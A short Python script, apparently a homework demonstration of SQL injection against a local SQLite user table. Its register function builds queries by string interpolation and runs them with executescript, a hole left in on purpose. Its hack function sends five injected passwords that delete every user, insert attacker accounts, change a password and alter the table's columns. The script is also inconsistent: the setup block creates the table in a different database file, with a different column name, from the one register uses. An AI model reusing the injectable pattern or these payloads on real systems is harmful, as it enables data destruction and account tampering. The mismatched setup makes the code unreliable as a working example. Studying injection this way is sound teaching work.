import sqlite3


def register(username: str, password: str) -> None:
    with sqlite3.connect('homework.db') as conn:
        cursor = conn.cursor()
        cursor.executescript(
            f"""
            INSERT INTO `table_users` (username, password)
            VALUES ('{username}', '{password}')  
            """
        )
        conn.commit()


def hack() -> None:
    username = "username"
    password = "'); DELETE FROM table_users; --"
    register(username, password)
    username = "username"
    password = "password'); INSERT INTO table_users (username, password) VALUES ('i_like', 'sql_injection');" \
               " INSERT INTO table_users (username, password) VALUES ('hackerman', 'qwerty');--"
    register(username, password)
    username = "username"
    password = "password'); UPDATE table_users SET password = '123password123' WHERE username = 'hackerman'; --"
    register(username, password)
    username = "username"
    password = "password'); ALTER TABLE table_users ADD COLUMN new_unknown_column; --"
    register(username, password)
    username = "username"
    password = "password'); ALTER TABLE table_users DROP COLUMN password; --"
    register(username, password)


if __name__ == "__main__":
    with sqlite3.connect("hw.db") as conn:
        cursor = conn.cursor()
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS table_users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT NOT NULL,
        password TEXT NOT NULL )
        """)
    hack()
